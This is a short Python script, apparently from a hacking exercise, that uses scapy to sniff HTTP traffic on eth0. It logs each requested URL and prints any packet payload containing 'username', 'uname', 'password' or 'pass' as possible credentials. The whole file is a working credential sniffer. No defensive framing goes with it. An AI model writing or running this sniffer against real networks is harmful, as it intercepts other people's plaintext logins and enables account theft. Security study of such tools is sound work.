import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(http.HTTPRequest):
            # url = get_url(packet)
            print(f'/+/ HTTP Request > {get_url(packet)}')

        if packet.haslayer(scapy.Raw):
            # print(packet.show())
            load = packet[scapy.Raw].load
            keywords = ['username', 'uname', 'password', 'pass']
            for word in keywords:
                if word in str(load):
                    print(f'--------------------\n/+/ Possible Credentials > {str(load)}\n--------------------')
                    break
            # if "uname" in str(load):
            #     print(str(load))


sniff('eth0')
